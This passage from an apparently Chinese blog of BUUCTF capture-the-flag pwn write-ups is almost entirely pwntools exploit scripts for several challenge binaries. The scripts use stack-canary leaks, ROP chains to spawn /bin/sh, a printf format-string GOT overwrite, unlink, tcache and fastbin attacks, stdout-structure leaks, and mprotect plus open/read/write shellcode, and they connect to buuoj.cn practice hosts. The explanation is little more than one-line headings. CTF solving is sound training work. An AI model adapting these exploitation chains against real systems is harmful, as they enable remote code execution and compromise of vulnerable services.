class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("web_of_sci_volga_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./web_of_sci_volga_2016")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">pop_rdi_ret = 0x4010a3</span><br><span class="line">pop_rsi_r15_ret = 0x4010a1</span><br><span class="line">payload = "\x00"</span><br><span class="line">sh.recvuntil("name")</span><br><span class="line">sh.sendline("%43$p")</span><br><span class="line">sh.recvuntil("0x")</span><br><span class="line">canary = int(sh.recvuntil(",",True),16)</span><br><span class="line">for i in range(9):</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline("0")</span><br><span class="line">offset = 0xa0 + 8</span><br><span class="line">payload = ''</span><br><span class="line">payload = payload.ljust(0xa0 - 0x18,'a')</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload = payload.ljust(offset,'a')</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(elf.got['__libc_start_main'])</span><br><span class="line">payload += p64(elf.plt['puts'])</span><br><span class="line">payload += p64(0x400FCD)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(": ")</span><br><span class="line">__libc_start_main = u64(sh.recvuntil("\x7f").ljust(8,'\x00'))</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">sh.recvuntil("name")</span><br><span class="line">sh.sendline("%43$p")</span><br><span class="line">sh.recvuntil("0x")</span><br><span class="line">canary = int(sh.recvuntil(",",True),16)</span><br><span class="line">for i in range(9):</span><br><span class="line">                sh.recvuntil(":")</span><br><span class="line">                sh.sendline("0")</span><br><span class="line">offset = 0xa0 + 8</span><br><span class="line">payload = ''</span><br><span class="line">payload = payload.ljust(0xa0 - 0x18,'a')</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload = payload.ljust(offset,'a')</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("pwn.buuoj.cn",20098,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x44-ciscn-2019-sw-1"><a href="#0x44-ciscn-2019-sw-1" class="headerlink" title="0x44 ciscn_2019_sw_1"></a>0x44 ciscn_2019_sw_1</h2><h3 id="printf花式溢出漏洞，无限循环"><a href="#printf花式溢出漏洞，无限循环" class="headerlink" title="printf花式溢出漏洞，无限循环"></a>printf花式溢出漏洞，无限循环</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("ciscn_2019_sw_1")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_sw_1")</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">main = 0x08048534</span><br><span class="line">fini = 0x0804979C</span><br><span class="line">system_plt = 0x080483D0</span><br><span class="line">offset = 0</span><br><span class="line">payload = p32(fini + 2) + p32(fini) + p32(elf.got['printf'] + 2) + p32(elf.got['printf'])</span><br><span class="line">payload += '%.' + str((main >> 16) - 4 - 5 - 8) + 'd%4$hn'</span><br><span class="line">payload += '%6$hn'</span><br><span class="line">payload += "%." + str(system_plt % 0x10000 - (main >> 16)) + "d%7$hn"</span><br><span class="line">payload += "%." + str(main % 0x10000 - (system_plt % 0x10000)) + "d%5$hn"</span><br><span class="line">log.success("puts_got: " + hex(elf.got['puts']))</span><br><span class="line">log.success("fini: " + hex(0x0804979C))</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.sendline("/bin/sh\x00")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("pwn.buuoj.cn",20127,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x45-中关村2019-one-string"><a href="#0x45-中关村2019-one-string" class="headerlink" title="0x45 [中关村2019]one_string"></a>0x45 [中关村2019]one_string</h2><h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("pwn")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">delay = 0.1</span><br><span class="line">data = ''</span><br><span class="line">data2 = ''</span><br><span class="line">def add(size,content):</span><br><span class="line">    global data</span><br><span class="line">    global data2</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    data += base64.b64encode("1")</span><br><span class="line">    data2 += "1\n"</span><br><span class="line">    sleep(delay)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    data += base64.b64encode(str(size))</span><br><span class="line">    data2 += str(size) + "\n"</span><br><span class="line">    sleep(delay)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    data += base64.b64encode(content)</span><br><span class="line">    data2 += content + "\n"</span><br><span class="line">    sleep(delay)</span><br><span class="line">def edit(idx,content):</span><br><span class="line">    global data</span><br><span class="line">    global data2</span><br><span class="line">    sh.sendline("3")</span><br><span class="line">    data += base64.b64encode("3")</span><br><span class="line">    data2 += "3\n"</span><br><span class="line">    sleep(delay)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    data += base64.b64encode(str(idx))</span><br><span class="line">    data2 += str(idx) + "\n"</span><br><span class="line">    sleep(delay)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line">    data += base64.b64encode(content)</span><br><span class="line">    data2 += content + "\n"</span><br><span class="line">def free(idx):</span><br><span class="line">    global data</span><br><span class="line">    global data2</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    data2 += "2\n"</span><br><span class="line">    data += base64.b64encode("2")</span><br><span class="line">    sleep(delay)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    data2 += str(idx) + "\n"</span><br><span class="line">    data += base64.b64encode(str(idx))</span><br><span class="line">    sleep(delay)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global data</span><br><span class="line">    global data2</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./pwn_back")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">    malloc_hook = 0x80EA4D8</span><br><span class="line">    chunk_list = 0x080EBA00</span><br><span class="line">    add(0x80,'\x99'*0x64)</span><br><span class="line">    add(0x80,'\x99'*0x64)</span><br><span class="line">    add(0x80,'\x99'*0x64)</span><br><span class="line">    add(0x84,'\x11'*0x84)</span><br><span class="line">    add(0xf8,'\x22'*0xf8)</span><br><span class="line">    add(0x24,'\x33'*0x24)</span><br><span class="line">    edit(3,'\x44'*0xf6)</span><br><span class="line">    payload = p32(0xdeadbeef) + p32(0x81) + p32(0x080EBA40 + 4*3 - 12) + p32(0x080EBA40 +3*4 - 8)</span><br><span class="line">    payload = payload.ljust(0x80,'\x44') + p32(0x80)</span><br><span class="line">    edit(3,payload)</span><br><span class="line">    free(4)</span><br><span class="line">    open_shellcode = "xor ecx,ecx;xor edx,edx;mov eax,0x5;push 0x00000067;push 0x616c662f;mov ebx,esp;int 0x80;"</span><br><span class="line">    read_shellcode = "mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x40;int 0x80;"</span><br><span class="line">    write_shellcode = "mov eax,0x4;mov ebx,0x1;mov edx,0x40;int 0x80;"</span><br><span class="line">    shellcode = open_shellcode + read_shellcode + write_shellcode</span><br><span class="line">    payload = asm(shellcode)</span><br><span class="line">    edit(3,p32(0x80eba00))</span><br><span class="line">    edit(0,p32(0x500)*6)</span><br><span class="line">    edit(3,p32(0x80EA4D8)*2 + p32(0x80eba60))</span><br><span class="line">    edit(2,payload)</span><br><span class="line">    edit(1,p32(0x80eba60))</span><br><span class="line">    add(0x55,"")</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("node1.buuoj.cn",28948,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x46-ciscn-final-5"><a href="#0x46-ciscn-final-5" class="headerlink" title="0x46 ciscn_final_5"></a>0x46 ciscn_final_5</h2><h3 id="将inuse位作为idx，但是idx-0x10存在漏洞"><a href="#将inuse位作为idx，但是idx-0x10存在漏洞" class="headerlink" title="将inuse位作为idx，但是idx = 0x10存在漏洞"></a>将inuse位作为idx，但是idx = 0x10存在漏洞</h3><h3 id="利用思路：1、采用stack-leak，接着tcache-attack，然后rop。2、le3d1ing师傅采用IO的方式，十六分之一的概率可以拿到shell"><a href="#利用思路：1、采用stack-leak，接着tcache-attack，然后rop。2、le3d1ing师傅采用IO的方式，十六分之一的概率可以拿到shell" class="headerlink" title="利用思路：1、采用stack leak，接着tcache attack，然后rop。2、le3d1ing师傅采用IO的方式，十六分之一的概率可以拿到shell"></a>利用思路：1、采用stack leak，接着tcache attack，然后rop。2、le3d1ing师傅采用IO的方式，十六分之一的概率可以拿到shell</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_final_5")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(idx,size,content):</span><br><span class="line">    sh.recvuntil("your choice: ")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recvuntil("index:")</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil("size:")</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil("content:")</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recvuntil("low 12 bits: ")</span><br><span class="line">    return int(sh.recvuntil("\n",True),16)</span><br><span class="line">def free(idx):</span><br><span class="line">    sh.recvuntil("your choice: ")</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    sh.recvuntil("index:")</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">def edit(idx,content):</span><br><span class="line">    sh.recvuntil("your choice: ")</span><br><span class="line">    sh.sendline("3")</span><br><span class="line">    sh.recvuntil("index:")</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil("content:")</span><br><span class="line">    sh.send(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./ciscn_final_5")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("libc.so.6")</span><br><span class="line">    pop_rdi_ret = 0x400f53</span><br><span class="line">    pop_rsi_r15_ret = 0x400f51</span><br><span class="line">    chunk_list = 0x6020E0</span><br><span class="line">    add(1,(0x100 - 0x60 - 0x8),"%6$p")</span><br><span class="line">    payload = p64(0) + p64(0x81)</span><br><span class="line">    payload = payload.ljust(0x38,'\x12')</span><br><span class="line">    add(0x10,0x38,payload)</span><br><span class="line">    add(2,0xe8,'\x13')</span><br><span class="line">    free(0)</span><br><span class="line">    free(2)</span><br><span class="line">    payload = 0x20 * '\x14' + p64(0) + p64(0xf1) + p64(chunk_list - 0x8)</span><br><span class="line">    add(2,0x78,payload)</span><br><span class="line">    add(3,0xe8,p64(chunk_list - 8))</span><br><span class="line">    payload = p64(0) + p64(chunk_list) + p64(elf.got['free']) + p64(0x602191)</span><br><span class="line">    payload = payload.ljust(0xA0 + 8,'\x00')</span><br><span class="line">    payload += p32(0x500) * 4 + "%6$p"</span><br><span class="line">    add(4,0xe8,payload)</span><br><span class="line">    edit(8,p64(0) + p64(elf.plt['printf']))</span><br><span class="line">    free(1)</span><br><span class="line">    sh.recvuntil("0x")</span><br><span class="line">    ebp = int(sh.recvuntil("free success.\n",True),16)</span><br><span class="line">    ret_addr = ebp - 0x7fffffffdef0 + 0x7fffffffddc8</span><br><span class="line">    payload = ''</span><br><span class="line">    if(ret_addr % 0x10 == 8):</span><br><span class="line">        payload = 'a' * 8</span><br><span class="line">    edit(0,p64(ret_addr))</span><br><span class="line">    payload += p64(pop_rdi_ret)</span><br><span class="line">    payload += p64(elf.got['__libc_start_main'])</span><br><span class="line">    payload += p64(elf.plt['puts'])</span><br><span class="line">    payload += p64(0x400D91)</span><br><span class="line">    edit(ret_addr%0x10,payload)</span><br><span class="line">    __libc_start_main = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))</span><br><span class="line">    libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">    system = libc +lib.symbols['system']</span><br><span class="line">    binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">    payload = ''</span><br><span class="line">    if(ret_addr % 0x10 == 8):</span><br><span class="line">        payload = 'a' * 8</span><br><span class="line">    payload += p64(pop_rdi_ret)</span><br><span class="line">    payload += p64(binsh)</span><br><span class="line">    payload += p64(system + 0x1b)</span><br><span class="line">    sh.sendlineafter(":",str(ret_addr%0x10))</span><br><span class="line">    sh.sendlineafter(":",payload)</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("pwn.buuoj.cn",20234,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x47-ciscn-2019-sw-10"><a href="#0x47-ciscn-2019-sw-10" class="headerlink" title="0x47 ciscn_2019_sw_10"></a>0x47 ciscn_2019_sw_10</h2><h3 id="orw，注意栈的动态即可"><a href="#orw，注意栈的动态即可" class="headerlink" title="orw，注意栈的动态即可"></a>orw，注意栈的动态即可</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_sw_10")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.sendlineafter(">>","1")</span><br><span class="line">sh.sendlineafter("?",str(size))</span><br><span class="line">sh.sendafter("?",content)</span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(">>","3")</span><br><span class="line">sh.sendlineafter("?",str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">sh.sendlineafter(">>","2")</span><br><span class="line">sh.sendlineafter("?",str(idx))</span><br><span class="line">def inputName(content):</span><br><span class="line">sh.sendafter("what is your name?",content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_sw_10")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x64_libc.so.6")</span><br><span class="line">inputName(p64(0x61) * (0x100 / 8))</span><br><span class="line">add(0x68,'\x11' * 0x68)</span><br><span class="line">add(0x68,'\x12' * 0x68)</span><br><span class="line">payload = '\x13' * 0x50 + p64(0) + p64(0x71)</span><br><span class="line">add(0x68,payload)</span><br><span class="line">add(0x88,'\x14' * 0x88)</span><br><span class="line">add(0x38,'\x15' * 0x38)</span><br><span class="line">add(0x38,'\x15' * 0x38)</span><br><span class="line">add(0x58,'%17$paaaa%54$p')</span><br><span class="line">free(3)</span><br><span class="line">show(3)</span><br><span class="line">main_arena = u64(sh.recvuntil("\x7f")[-6:].ljust(8,'\x00')) - 88</span><br><span class="line">libc = main_arena - 0x10 - lib.symbols['__malloc_hook']</span><br><span class="line">system = libc +lib.symbols['system']</span><br><span class="line">binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line">stdout = libc + lib.symbols['_IO_2_1_stdout_']</span><br><span class="line">printf = libc + lib.symbols['printf']</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">heap_base = (u64(sh.recvuntil('\n--------------------',True)[-3:].ljust(8,'\x00')) >> 8) << 8</span><br><span class="line">add(0x68,p64(stdout - 0x43))</span><br><span class="line">add(0x68,p64(stdout - 0x43))</span><br><span class="line">add(0x68,p64(stdout - 0x43))</span><br><span class="line">payload = '\x00' * 3</span><br><span class="line">payload += p64(0) * 6</span><br><span class="line">payload += p64(0xfbad1800) + p64(0) * 3 + p64(libc + lib.symbols['environ']) + p64(libc + lib.symbols['environ'] + 0x8)</span><br><span class="line">add(0x68,payload)</span><br><span class="line">stack_end = u64(sh.recvuntil("--------------------",True)[-8:])</span><br><span class="line">canary_pos = stack_end - (0xe548 - 0xe448)</span><br><span class="line">fastbin_attack = stack_end - 0x7fffffffe548 + 0x7fffffffe2c5 + 8</span><br><span class="line">ret_addr = stack_end - 0x7fffe75e88f8 + 0x7fffe75e86b8</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">add(0x68,p64(stdout - 0x43))</span><br><span class="line">add(0x68,p64(stdout - 0x43))</span><br><span class="line">add(0x68,p64(stdout - 0x43))</span><br><span class="line">payload = '\x00' * 3</span><br><span class="line">payload += p64(0) * 6</span><br><span class="line">payload += p64(0xfbad1800) + p64(0) * 3 + p64(canary_pos) + p64(canary_pos + 0x8)</span><br><span class="line">add(0x68,payload)</span><br><span class="line">canary = u64(sh.recvuntil("--------------------",True)[-8:])</span><br><span class="line">pop_rdi_ret = 0x400d43</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">add(0x68,p64(fastbin_attack))</span><br><span class="line">add(0x68,p64(fastbin_attack))</span><br><span class="line">add(0x68,p64(fastbin_attack))</span><br><span class="line">offset = 40</span><br><span class="line">payload = '\x00' * 3</span><br><span class="line">payload += '\x00' * offset</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(libc + lib.search(asm("pop rsi\nret")).next())</span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line">payload += p64(libc + lib.search(asm("pop rdx\nret")).next())</span><br><span class="line">payload += p64(0x100)</span><br><span class="line">payload += p64(libc + lib.symbols['read'])</span><br><span class="line">sleep(0.2)</span><br><span class="line">add(0x68,payload)</span><br><span class="line">offset = 56</span><br><span class="line">payload = '\x00' * offset</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64((elf.bss() >> 12) << 12)</span><br><span class="line">payload += p64(libc + lib.search(asm("pop rsi\nret")).next())</span><br><span class="line">payload += p64(0x2000)</span><br><span class="line">payload += p64(libc + lib.search(asm("pop rdx\nret")).next())</span><br><span class="line">payload += p64(7)</span><br><span class="line">payload += p64(libc + lib.symbols['mprotect'])</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(libc + lib.search(asm("pop rsi\nret")).next())</span><br><span class="line">payload += p64(((elf.bss() >> 12) << 12) + 0x800)</span><br><span class="line">payload += p64(libc + lib.search(asm("pop rdx\nret")).next())</span><br><span class="line">payload += p64(0x100)</span><br><span class="line">payload += p64(libc + lib.symbols['read'])</span><br><span class="line">payload += p64(((elf.bss() >> 12) << 12) + 0x800)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(payload)</span><br><span class="line">shellcode  = shellcraft.amd64.open("./flag.txt")</span><br><span class="line">shellcode += shellcraft.amd64.read(3,elf.bss(),0x30)</span><br><span class="line">shellcode += shellcraft.amd64.write(1,elf.bss(),0x30)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.send(asm(shellcode))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span 